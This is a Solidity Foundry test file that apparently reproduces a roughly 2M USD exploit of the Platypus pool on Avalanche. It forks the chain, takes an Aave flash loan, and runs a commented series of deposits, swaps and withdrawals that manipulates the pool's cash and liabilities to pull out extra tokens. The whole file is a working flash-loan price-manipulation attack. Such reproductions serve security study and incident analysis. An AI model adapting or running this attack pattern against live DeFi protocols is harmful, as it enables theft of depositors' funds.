// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~2M USD$
// Attacker : https://snowtrace.io/address/0x0cd4fd0eecd2c5ad24de7f17ae35f9db6ac51ee7
// Attack Contract : https://snowtrace.io/address/0x44e251786a699518d6273ea1e027cec27b49d3bd
// Vulnerable Contract : https://snowtrace.io/address/0xe5c84c7630a505b6adf69b5594d0ff7fedd5f447
// Attack Tx : https://snowtrace.io/tx/0x4425f757715e23d392cda666bc0492d9e5d5848ff89851a1821eab5ed12bb867 mutiple txs

// @Info
// Vulnerable Contract Code : https://snowtrace.io/address/0xe5c84c7630a505b6adf69b5594d0ff7fedd5f447#code

// @Analysis
// Twitter Guy : https://twitter.com/BlockSecTeam/status/1712445197538468298
// Twitter Guy : https://twitter.com/peckshield/status/1712354198246035562

interface IPlatypusPool {
    function deposit(address token, uint256 amount, address to, uint256 deadline) external returns (uint256);

    function withdraw(
        address token,
        uint256 liquidity,
        uint256 minimumAmount,
        address to,
        uint256 deadline
    ) external returns (uint256);

    function swap(
        address fromToken,
        address toToken,
        uint256 fromAmount,
        uint256 minimumToAmount,
        address to,
        uint256 deadline
    ) external returns (uint256, uint256);
}

contract ContractTest is Test {
    IERC20 WAVAX = IERC20(0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7);
    IERC20 SAVAX = IERC20(0x2b2C81e08f1Af8835a78Bb2A90AE924ACE0eA4bE);
    IERC20 LP_AVAX = IERC20(0xC73eeD4494382093C6a7C284426A9a00f6C79939);
    IERC20 LP_sAVAX = IERC20(0xA2A7EE49750Ff12bb60b407da2531dB3c50A1789);
    IPlatypusPool PlatypusPool = IPlatypusPool(0x4658EA7e9960D6158a261104aAA160cC953bb6ba);
    IAaveFlashloan aaveV3 = IAaveFlashloan(0x794a61358D6845594F94dc1DB02A252b5b4814aD);

    function setUp() public {
        vm.createSelectFork("Avalanche", 36_346_397);
        vm.label(address(WAVAX), "WAVAX");
        vm.label(address(SAVAX), "SAVAX");
        vm.label(address(LP_AVAX), "LP_AVAX");
        vm.label(address(LP_sAVAX), "LP_sAVAX");
        vm.label(address(aaveV3), "aaveV3");
        vm.label(address(PlatypusPool), "PlatypusPool");
    }

    function testExploit() public {
        WAVAX.approve(address(PlatypusPool), type(uint256).max);
        SAVAX.approve(address(PlatypusPool), type(uint256).max);

        address[] memory assets = new address[](2);
        assets[0] = address(WAVAX);
        assets[1] = address(SAVAX);
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 1_054_969 * 1e18;
        amounts[1] = 950_996 * 1e18;
        uint256[] memory modes = new uint[](2);
        modes[0] = 0;
        modes[1] = 0;
        aaveV3.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);

        emit log_named_decimal_uint(
            "Attacker WAVAX balance after exploit", WAVAX.balanceOf(address(this)), WAVAX.decimals()
        );

        emit log_named_decimal_uint(
            "Attacker SAVAX balance after exploit", SAVAX.balanceOf(address(this)), SAVAX.decimals()
        );
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external payable returns (bool) {
        WAVAX.approve(address(aaveV3), amounts[0] + premiums[0]);
        SAVAX.approve(address(aaveV3), amounts[1] + premiums[1]);

        PlatypusPool.deposit(address(WAVAX), amounts[0], address(this), block.timestamp + 1000); //deposit WAVAX, mint LP_AVAX
        PlatypusPool.deposit(address(SAVAX), amounts[1] / 3, address(this), block.timestamp + 1000); //deposit SAVAX, mint LP_sAVAX

        PlatypusPool.swap(address(SAVAX), address(WAVAX), 600_000 * 1e18, 0, address(this), block.timestamp + 1000); // manipulate the cash and liabilities of the LP_AVAX pool
        PlatypusPool.withdraw(address(WAVAX), 1_020_000 * 1e18, 0, address(this), block.timestamp + 1000); // inflate the WAVAX price in platypus pool

        PlatypusPool.swap(address(WAVAX), address(SAVAX), 1_200_000 * 1e18, 0, address(this), block.timestamp + 1000); // swap WAVAX to SAVAX, earn more SAVAX

        PlatypusPool.withdraw(
            address(WAVAX), LP_AVAX.balanceOf(address(this)), 0, address(this), block.timestamp + 1000
        ); // withdraw LP_AVAX
        PlatypusPool.swap(address(SAVAX), address(WAVAX), 600_000 * 1e18, 0, address(this), block.timestamp + 1000); // swap SAVAX to WAVAX
        PlatypusPool.withdraw(
            address(SAVAX), LP_sAVAX.balanceOf(address(this)), 0, address(this), block.timestamp + 1000
        ); // withdraw LP_sAVAX

        return true;
    }
}
